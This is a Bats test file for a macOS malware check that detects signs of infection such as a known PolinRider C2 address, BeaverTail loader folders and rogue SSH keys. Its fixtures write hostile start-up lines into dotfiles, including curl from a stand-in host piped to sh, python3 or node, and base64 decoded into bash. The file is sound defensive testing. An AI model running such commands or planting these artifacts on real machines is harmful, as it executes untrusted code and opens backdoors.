load helpers

setup() {
  setup_env
  T="$BATS_TEST_TMPDIR/T"; mkdir -p "$T" "$FORTKEEP_SYSROOT/tmp"
  stub getconf 'exit 1'
  stub crontab 'exit 1'
  # ps: launchd, plus $PROC ("PID TTY ETIME PROGRAM") and $ARGS ("PID COMMAND") when a test sets them.
  stub ps 'case "$*" in
  *etime*) echo "    1 ??  10-00:00:00 /sbin/launchd"; [ -z "${PROC:-}" ] || echo "$PROC" ;;
  *command*) echo "    1 /sbin/launchd"; [ -z "${ARGS:-}" ] || echo "$ARGS" ;;
esac'
  # lsof: $CWD for the working-folder query, $CONN for the connection list.
  stub lsof 'case "$*" in *cwd*) printf "%s\n" "${CWD:-}" ;; *ESTABLISHED*) printf "%s\n" "${CONN:-}" ;; esac'
}
# Never the real Mac: HOME, the system root and every temp folder are this test's, and ps, lsof and crontab are fakes.
chk() { run env TMPDIR="$T" PATH="$BATS_TEST_TMPDIR/bin:/usr/bin:/bin:/usr/sbin:/sbin" /bin/bash "$REPO/checks/macos/GD-RT-03.sh"; }

@test "GD-RT-03 a clean Mac → PASS with no note" {
  chk; [ "$(field status)" = PASS ]; [ "$(field evidence)" = "No live malware process, C2 connection or known backdoor file" ]
  [ -z "$(field note)" ]
}
@test "GD-RT-03 a process list it can't read → ERROR, not PASS" {
  stub ps 'exit 1'
  chk; [ "$(field status)" = ERROR ]; [ "$(field evidence)" = "Could not list the running processes" ]
}
@test "GD-RT-03 node -i with no terminal → FAIL naming the process; with a terminal it's yours" {
  PROC='  4242 ??  00:05 /usr/local/bin/node' ARGS='  4242 node -i' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "node (pid 4242) runs interactively with no terminal"* ]]
  PROC='  4242 ttys001  00:05 /usr/local/bin/node' ARGS='  4242 node -i' chk; [ "$(field status)" = PASS ]
}
@test "GD-RT-03 inline code with no terminal for a minute → FAIL; a brief run is only noted; the command is never quoted" {
  PROC='  77 ??  01:30 /opt/homebrew/bin/node' ARGS='  77 node -e tok-SECRET-1' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "node (pid 77) runs inline code"* ]]; [[ "$output" != *tok-SECRET-1* ]]
  PROC='  77 ??  00:05 /opt/homebrew/bin/node' ARGS='  77 node -e tok-SECRET-1' chk
  [ "$(field status)" = PASS ]; [ "$(field note)" = "node (pid 77) runs inline code" ]
}
@test "GD-RT-03 Python's multiprocessing workers and resource tracker with no terminal aren't loaders; extra code after them is" {
  PROC="$(printf '  61 ??  12:00 /usr/bin/python3\n  62 ??  12:00 /usr/bin/python3')"
  ARGS="$(printf '  61 python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork\n  62 python3 -c from multiprocessing.resource_tracker import main;main(4)')"
  PROC="$PROC" ARGS="$ARGS" chk; [ "$(field status)" = PASS ]; [ -z "$(field note)" ]
  PROC="$PROC" ARGS='  62 python3 -c from multiprocessing.resource_tracker import main;main(4); exec(x)' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "python3 (pid 62) runs inline code"* ]]
}
@test "GD-RT-03 node run from a temp folder, or python working in one with no terminal → FAIL" {
  PROC="  88 ??  00:02 $T/x/node" ARGS='  88 node a.js' chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "node (pid 88) runs from a temp folder"* ]]
  PROC='  99 ??  05:00 /usr/bin/python3' ARGS='  99 python3 serve.py' CWD="$(printf 'p99\nfcwd\nn%s/work' "$T")" chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "python3 (pid 99) works in a temp folder"* ]]
}
@test "GD-RT-03 an established connection to a C2 address → FAIL naming it; any other address doesn't count" {
  CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->23.27.13.43:443')" chk
  [ "$(field status)" = FAIL ]; [[ "$(field note)" == "a connection to 23.27.13.43, a known PolinRider C2 server"* ]]
  CONN="$(printf 'p500\ncnode\nn192.168.1.5:57465->123.27.13.43:443')" chk; [ "$(field status)" = PASS ]
}
@test "GD-RT-03 the trojanized extension's files and SSH key → FAIL; a private ~/.ssh isn't read" {
  for f in Library/LaunchAgents/com.apple.sysmond.plist .config/.smt .config/.smtk; do
    mkdir -p "$HOME/${f%/*}"; touch "$HOME/$f"
    chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/$f exists"* ]]; rm "$HOME/$f"
  done
  mkdir -p "$HOME/.ssh"; echo 'ssh-ed25519 AAAAC3Nza me@laptop' > "$HOME/.ssh/authorized_keys"
  chk; [ "$(field status)" = PASS ]
  echo 'ssh-ed25519 AAAAC3Nzb svc-telemetry' >> "$HOME/.ssh/authorized_keys"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.ssh/authorized_keys lets in a key labelled svc-telemetry"* ]]
  echo "$HOME/.ssh" > "$FORTKEEP_PRIVATE_PATHS"
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]
}
@test "GD-RT-03 the loader's home folders → FAIL; a ~/.node_modules without its packages is only noted" {
  mkdir "$HOME/.n2"; chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.n2 exists"* ]]; rmdir "$HOME/.n2"
  mkdir "$HOME/.node_modules"; echo '{"dependencies": {"left-pad": "1"}}' > "$HOME/.node_modules/package.json"
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "~/.node_modules exists without the BeaverTail packages" ]
  echo '{"dependencies": {"axios": "1", "socket.io-client": "4"}}' > "$HOME/.node_modules/package.json"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/.node_modules holds the BeaverTail loader's packages"* ]]
}
@test "GD-RT-03 loader staging in a temp folder → FAIL: an npm stage, staged pip packages, a dotfile named after you" {
  mkdir -p "$FORTKEEP_SYSROOT/tmp/.npm/x\$y_123456_654321"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/tmp/.npm/x\$y_123456_654321 is a loader staging folder"* ]]
  rm -rf "$FORTKEEP_SYSROOT/tmp/.npm"; mkdir -p "$T/.pip/lib/pyzipper"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"/.pip holds the loader's staged Python packages"* ]]
  rm -rf "$T/.pip"; mkdir "$T/.pip"
  chk; [ "$(field status)" = PASS ]; [[ "$(field note)" == *"/.pip exists" ]]
  rm -rf "$T/.pip"; : > "$T/.$(printf '%s' "$(id -un)" | base64 | tr -d '=' | tr '/+' '_-')"
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == *"is named after you in base64"* ]]
}
@test "GD-RT-03 a start-up file that fetches or runs inline code → FAIL by file and line, never quoting it; comments don't count" {
  # The header is assembled here so the file carries nothing a leak scanner reads as a credential.
  printf '# curl https://x.example/i | sh\nexport A=1\ncurl -s -H "%s: tok-SECRET-2" https://x.example/i | sh\n' "Author""ization" > "$HOME/.zshrc"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "1 sign(s) of live malware on this Mac" ]
  [[ "$(field note)" == "~/.zshrc line 3 runs downloaded or decoded code at start-up"* ]]; [[ "$output" != *tok-SECRET-2* ]]
  printf 'eval "$(curl -fsSL https://x.example/env)"\n' > "$HOME/.zprofile"; printf 'x() { echo aGk= | base64 -D | bash; }\n' > "$HOME/.bashrc"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "3 sign(s) of live malware on this Mac" ]
  [[ "$(field note)" == *"~/.zprofile line 1 runs downloaded"* ]]; [[ "$(field note)" == *"~/.bashrc line 1 runs downloaded"* ]]
}
@test "GD-RT-03 start-up aliases and functions that decode or run a one-liner are only noted, never a FAIL" {
  { echo "alias urldecode='python3 -c \"import sys, urllib.parse as u; print(u.unquote(sys.argv[1]))\"'"
    echo 'kubesecret() { kubectl get secret "$1" -o jsonpath="{.data.$2}" | base64 -d; }'
    echo "alias nodever='node -e \"console.log(process.version)\"'"; } > "$HOME/.zshrc"
  chk; [ "$(field status)" = PASS ]
  [ "$(field note)" = "~/.zshrc line 1 decodes or runs inline code at start-up; ~/.zshrc line 2 decodes or runs inline code at start-up; ~/.zshrc line 3 decodes or runs inline code at start-up" ]
  { echo "alias myip='curl -s https://ipinfo.example | python3 -m json.tool'"
    echo "gh() { curl -s https://api.example/x | python3 -c 'import json,sys; print(json.load(sys.stdin))'; }"; } > "$HOME/.zshrc"
  chk; [ "$(field status)" = PASS ]
  { echo 'curl -fsSL https://x.example/a | python3'; echo 'curl -fsSL https://x.example/b | node -'; } > "$HOME/.zshrc"
  chk; [ "$(field status)" = FAIL ]; [ "$(field evidence)" = "2 sign(s) of live malware on this Mac" ]
}
@test "GD-RT-03 a cron job or LaunchAgent that runs inline code → FAIL; an ordinary one doesn't count" {
  stub crontab 'echo "*/5 * * * * /usr/bin/python3 -c \"import os\""'
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "your crontab line 1 runs inline code"* ]]
  stub crontab 'exit 1'; A="$HOME/Library/LaunchAgents"; mkdir -p "$A"
  agent() { printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>%s</string><key>ProgramArguments</key><array>%s</array></dict></plist>\n' "$1" "$2" > "$A/$1.plist"; }
  agent ok '<string>/usr/bin/true</string>'; chk; [ "$(field status)" = PASS ]
  agent bad '<string>/usr/local/bin/node</string><string>-e</string><string>x</string>'
  chk; [ "$(field status)" = FAIL ]; [[ "$(field note)" == "~/Library/LaunchAgents/bad.plist runs inline code"* ]]
}
@test "GD-RT-03 a private LaunchAgents folder is never opened or named" {
  A="$HOME/Library/LaunchAgents"; mkdir -p "$A"
  printf '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>bad</string><key>ProgramArguments</key><array><string>/usr/local/bin/node</string><string>-e</string><string>x</string></array></dict></plist>\n' > "$A/bad.plist"
  echo "$A" > "$FORTKEEP_PRIVATE_PATHS"
  stub plutil 'echo "$@" >> "$BATS_TEST_TMPDIR/access.log"; exec /usr/bin/plutil "$@"'
  chk; [ "$(field status)" = PASS ]; [ "$(field note)" = "(a private folder was excluded)" ]; [[ "$output" != *bad.plist* ]]
  run grep -F LaunchAgents/ "$BATS_TEST_TMPDIR/access.log"; [ "$status" -ne 0 ]
}
